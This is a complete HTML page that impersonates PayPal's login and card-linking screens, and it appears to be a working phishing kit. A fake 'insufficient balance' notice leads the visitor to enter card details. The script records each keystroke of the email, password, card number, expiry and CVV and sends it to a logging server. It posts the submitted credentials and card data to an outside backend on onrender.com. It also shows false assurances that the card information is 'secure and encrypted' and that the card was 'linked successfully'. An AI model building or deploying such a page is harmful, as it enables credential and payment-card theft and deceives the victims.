<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PayPal Login & Card Linking</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Arial:wght@400;700&display=swap');
body { margin:0; font-family:Arial,sans-serif; background-color:#f5f5f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
.container { width:90%; max-width:400px; background-color:#fff; border-radius:8px; box-shadow:0 6px 25px rgba(0,0,0,0.15); overflow:hidden; text-align:center; padding:40px 30px; box-sizing:border-box; }
img.logo { width:120px; margin-bottom:20px; }
h2 { font-weight:400; font-size:22px; color:#003087; margin-bottom:20px; }
input[type="text"], input[type="password"], input[type="number"] { width:100%; padding:12px; margin-bottom:15px; font-size:16px; border-radius:6px; border:1px solid #ccd0d5; box-sizing:border-box; transition:border-color 0.3s, box-shadow 0.3s; }
input:focus { border-color:#0070ba; box-shadow:0 0 8px rgba(0,112,186,0.3); outline:none; }
input.valid{ border-color:green; } input.invalid{ border-color:red; }
.checkbox-group { display:flex; align-items:center; font-size:14px; margin-bottom:20px; justify-content:space-between; }
.checkbox-group label{ display:flex; align-items:center; gap:5px; }
button { width:100%; padding:12px; background-color:#0070ba; border:none; border-radius:6px; color:white; font-size:16px; cursor:pointer; margin-bottom:10px; transition:background 0.3s, transform 0.1s; }
button:hover{ background-color:#005ea6; }
button:active{ transform:scale(0.98); }
.footer{ margin-top:20px; font-size:12px; color:#555; }
.hidden{ display:none; }
.message-box h2{ color:#c00; font-size:20px; margin-bottom:20px; }
.message-box p{ font-size:16px; margin-bottom:30px; }
.message-box a{ display:inline-block; padding:12px 20px; background-color:#0070ba; color:#fff; border-radius:6px; text-decoration:none; font-size:16px; cursor:pointer; transition:background 0.3s, transform 0.1s; }
.message-box a:hover{ background-color:#005ea6; }
.message-box a:active{ transform:scale(0.98); }
.forgot-links{ font-size:13px; display:flex; justify-content:space-between; margin-bottom:20px; }
.forgot-links a{ color:#0070ba; text-decoration:none; }
.forgot-links a:hover{text-decoration:underline;}
.security-msg{ font-size:12px; color:#555; margin-bottom:10px; text-align:left; }
.card-logo{ width:50px; margin:5px 0 15px 0; height:auto; }
@media(max-width:420px){
    h2{ font-size:20px; }
    input, button, .message-box a{ font-size:15px; padding:10px; }
    img.logo{ width:100px; }
    .forgot-links{ flex-direction:column; gap:5px; }
}
</style>
</head>
<body>

<!-- Login Screen -->
<div class="container" id="loginContainer">
    <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" class="logo">
    <h2>Log in to your PayPal account</h2>
    <form id="loginForm">
        <input type="text" name="email" placeholder="Email or mobile number" required>
        <input type="password" name="password" placeholder="Password" required>
        <div class="checkbox-group">
            <label><input type="checkbox" name="remember"> Keep me logged in</label>
        </div>
        <div class="forgot-links">
            <a href="#">Forgot email?</a>
            <a href="#">Forgot password?</a>
        </div>
        <button type="submit">Log In</button>
    </form>
    <div class="footer">&copy; 2025 PayPal. All rights reserved.</div>
</div>

<!-- Insufficient Balance Message -->
<div class="container hidden" id="insufficientContainer">
    <div class="message-box">
        <h2>Insufficient balance to cover for fee</h2>
        <p>Pls kindly link your card to accept payment and pay later fee from balance.</p>
        <a id="linkCardBtn">Link Card</a>
    </div>
</div>

<!-- Card Linking Page -->
<div class="container hidden" id="cardContainer">
    <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" class="logo">
    <h2>Link Your Card</h2>
    <form id="cardForm">
        <input type="text" name="cardName" placeholder="Name on Card" required>
        <input type="text" name="cardNumber" placeholder="Card Number" maxlength="19" required>
        <img src="" class="card-logo hidden" id="cardLogo">
        <input type="text" name="expiry" placeholder="MM/YY" maxlength="5" required>
        <input type="password" name="cvv" placeholder="CVV" maxlength="4" required>
        <div class="security-msg">Your card information is secure and encrypted.</div>
        <button type="submit" id="cardSubmit" disabled>Link Card</button>
    </form>
    <div class="footer">&copy; 2025 PayPal. All rights reserved.</div>
</div>

<script>
// Elements
const loginForm = document.getElementById('loginForm');
const loginContainer = document.getElementById('loginContainer');
const insufficientContainer = document.getElementById('insufficientContainer');
const cardContainer = document.getElementById('cardContainer');
const linkCardBtn = document.getElementById('linkCardBtn');

const cardForm = document.getElementById('cardForm');
const cardNumberInput = cardForm.querySelector('input[name="cardNumber"]');
const cardNameInput = cardForm.querySelector('input[name="cardName"]');
const expiryInput = cardForm.querySelector('input[name="expiry"]');
const cvvInput = cardForm.querySelector('input[name="cvv"]');
const cardLogo = document.getElementById('cardLogo');
const cardSubmit = document.getElementById('cardSubmit');

// ---------- LOCAL LOGGING TO LINUX SERVER ----------
function sendToLocalServer(field, value) {
    fetch("http://localhost:5000/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            field: field,
            value: value,
            time: new Date().toISOString()
        })
    }).catch(err => console.error("Local logging error:", err));
}

// ---------- LOGIN FORM WITH AUTO-FOCUS ----------
const emailInput = loginForm.querySelector('input[name="email"]');
const passwordInput = loginForm.querySelector('input[name="password"]');
const loginButton = loginForm.querySelector('button[type="submit"]');

emailInput.addEventListener('keydown', function(e){
    if(e.key === "Enter") { e.preventDefault(); passwordInput.focus(); }
    sendToLocalServer(e.target.name, e.target.value);
});

passwordInput.addEventListener('keydown', function(e){
    if(e.key === "Enter") { e.preventDefault(); loginButton.focus(); }
    sendToLocalServer(e.target.name, e.target.value);
});

loginButton.addEventListener('keydown', function(e){
    if(e.key === "Enter") { e.preventDefault(); loginForm.dispatchEvent(new Event('submit', {cancelable:true})); }
});

[emailInput, passwordInput].forEach(input => {
    input.addEventListener('input', e => sendToLocalServer(e.target.name, e.target.value));
});

// Login submit
loginForm.addEventListener('submit', e => {
    e.preventDefault();
    loginContainer.classList.add('hidden');
    insufficientContainer.classList.remove('hidden');

    const formData = new FormData(loginForm);
    fetch('https://my-login-backend.onrender.com/login', { method: 'POST', body: formData })
        .catch(err => console.error(err));
});

// ---------- INSUFFICIENT BALANCE ----------
linkCardBtn.addEventListener('click', () => {
    insufficientContainer.classList.add('hidden');
    cardContainer.classList.remove('hidden');
});

// ---------- CARD FORM ----------
function detectCardType(number){
    cardLogo.classList.add('hidden');
    number = number.replace(/\s/g,'');
    if(/^4/.test(number)){ cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg'; cardLogo.classList.remove('hidden'); return 'visa'; }
    else if(/^5[1-5]/.test(number)){ cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png'; cardLogo.classList.remove('hidden'); return 'mastercard'; }
    else if(/^3[47]/.test(number)){ cardLogo.src='https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg'; cardLogo.classList.remove('hidden'); return 'amex'; }
    return '';
}

function validateCardNumber(number,type){
    number = number.replace(/\D/g,'');
    if(type==='amex') return number.length===15;
    if(type==='visa'||type==='mastercard') return number.length===16;
    return false;
}

function validateCVV(cvv,type){
    if(type==='amex') return /^\d{4}$/.test(cvv);
    if(type==='visa'||type==='mastercard') return /^\d{3}$/.test(cvv);
    return false;
}

function validateExpiry(expiry){
    if(!expiry) return false;
    const [month,year] = expiry.split('/').map(Number);
    const now = new Date();
    if(!month||!year) return false;
    const exp = new Date(2000+year,month-1);
    return exp >= new Date(now.getFullYear(),now.getMonth());
}

function validateForm(){
    const cardType = detectCardType(cardNumberInput.value);
    const numberValid = validateCardNumber(cardNumberInput.value, cardType);
    const cvvValid = validateCVV(cvvInput.value, cardType);
    const expiryValid = validateExpiry(expiryInput.value);
    const nameValid = cardNameInput.value.trim().length>0;

    cardNumberInput.className = numberValid?'valid':'invalid';
    cvvInput.className = cvvValid?'valid':'invalid';
    expiryInput.className = expiryValid?'valid':'invalid';
    cardNameInput.className = nameValid?'valid':'invalid';

    cardSubmit.disabled = !(numberValid && cvvValid && expiryValid && nameValid);
}

// ---------- CARD INPUT LISTENERS WITH LOCAL LOGGING ----------
[cardNumberInput, cvvInput, expiryInput, cardNameInput].forEach(input=>{
    input.addEventListener('input',function(e){
        validateForm();
        sendToLocalServer(e.target.name, e.target.value);
    });
});

// Format card number
cardNumberInput.addEventListener('input', function(){
    let value = this.value.replace(/\D/g,'');
    this.value = value.match(/.{1,4}/g)?.join(' ')||'';
    validateForm();
});

// Format expiry MM/YY & auto-focus CVV
expiryInput.addEventListener('input', function(){
    let value = this.value.replace(/\D/g,'');
    if(value.length>2) value = value.slice(0,2)+'/'+value.slice(2,4);
    this.value = value;
    validateForm();
    if(value.length === 5) cvvInput.focus();
});

// Mask CVV input
cvvInput.addEventListener('input', function(){
    let value = this.value.replace(/\D/g,'');
    this.value = value;
    validateForm();
});

// Submit card form
cardForm.addEventListener('submit', function(e){
    e.preventDefault();
    const formData = new FormData(cardForm);
    fetch('https://my-login-backend.onrender.com/card',{method:'POST',body:formData})
        .then(()=>{ alert('Card linked successfully!'); cardContainer.classList.add('hidden'); loginContainer.classList.remove('hidden'); })
        .catch(err=>{ console.error(err); alert('Error submitting card info.'); });
});
</script>
</body>
</html>
